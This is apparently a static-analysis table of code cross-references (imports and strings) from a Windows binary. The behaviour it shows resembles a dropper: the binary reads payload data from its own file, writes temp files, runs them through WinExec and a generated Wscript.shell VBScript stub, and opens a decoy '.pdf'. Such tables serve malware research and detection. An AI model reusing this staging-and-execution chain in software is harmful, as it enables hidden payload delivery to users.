reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40111a	0x403058	import	0x4010f0	KERNEL32.dll.GetTempPathA
0x40112c	0x40305c	import	0x4010f0	KERNEL32.dll.GetTempFileNameA
0x401149	0x403060	import	0x4010f0	KERNEL32.dll.CreateFileA
0x401177	0x403064	import	0x4010f0	KERNEL32.dll.SetFilePointer
0x4011a2	0x403068	import	0x4010f0	KERNEL32.dll.ReadFile
0x4011bd	0x40306c	import	0x4010f0	KERNEL32.dll.WriteFile
0x4011c4	0x403004	import	0x4010f0	KERNEL32.dll.CloseHandle
0x4011d1	0x40303c	import	0x4010f0	KERNEL32.dll.WinExec
0x4011e8	0x403004	import	0x4010f0	KERNEL32.dll.CloseHandle
0x401210	0x403058	import	0x401200	KERNEL32.dll.GetTempPathA
0x401222	0x40305c	import	0x401200	KERNEL32.dll.GetTempFileNameA
0x401268	0x403060	import	0x401200	KERNEL32.dll.CreateFileA
0x40127f	0x403628	string	0x401200	Set Shell=Wscript.Createobject("Wscript.shell")\r\n
0x401293	0x40306c	import	0x401200	KERNEL32.dll.WriteFile
0x4012a8	0x403628	string	0x401200	Set Shell=Wscript.Createobject("Wscript.shell")\r\n
0x4012b0	0x40360c	string	0x401200	Shell.run """
0x4012db	0x40360c	string	0x401200	Shell.run """
0x40130d	0x403600	string	0x401200	"""\r\n
0x401330	0x403600	string	0x401200	"""\r\n
0x401339	0x403004	import	0x401200	KERNEL32.dll.CloseHandle
0x40134a	0x4035f8	string	0x401200	open
0x401351	0x4030f8	import	0x401200	SHELL32.dll.ShellExecuteA
0x401379	0x403050	import	0x401360	KERNEL32.dll.CreateFileW
0x401388	0x403054	import	0x401360	KERNEL32.dll.ExitProcess
0x40139e	0x40306c	import	0x401360	KERNEL32.dll.WriteFile
0x4013a5	0x403004	import	0x401360	KERNEL32.dll.CloseHandle
0x4013fb	0x403064	import	0x4013c0	KERNEL32.dll.SetFilePointer
0x401413	0x403068	import	0x4013c0	KERNEL32.dll.ReadFile
0x40143a	0x403064	import	0x4013c0	KERNEL32.dll.SetFilePointer
0x40144a	0x403068	import	0x4013c0	KERNEL32.dll.ReadFile
0x401496	0x403040	import	0x401470	KERNEL32.dll.GetModuleHandleA
0x4014a7	0x403044	import	0x401470	KERNEL32.dll.GetModuleFileNameW
0x40154c	0x4036a8	string	0x401470	.pdf
0x40156d	0x403048	import	0x401470	KERNEL32.dll.OutputDebugStringW
0x401588	0x403050	import	0x401470	KERNEL32.dll.CreateFileW
0x401596	0x403054	import	0x401470	KERNEL32.dll.ExitProcess
0x4015af	0x40304c	import	0x401470	KERNEL32.dll.GetFileSize
0x4015bd	0x403064	import	0x401470	KERNEL32.dll.SetFilePointer
0x4015c3	0x403068	import	0x401470	KERNEL32.dll.ReadFile
0x40161a	0x401680	string	0x401470	]_^2
0x401648	0x403690	string	0x401470	offset param %x-%x-%x
0x40164e	0x403078	import	0x401470	MSVCR90.dll.sprintf
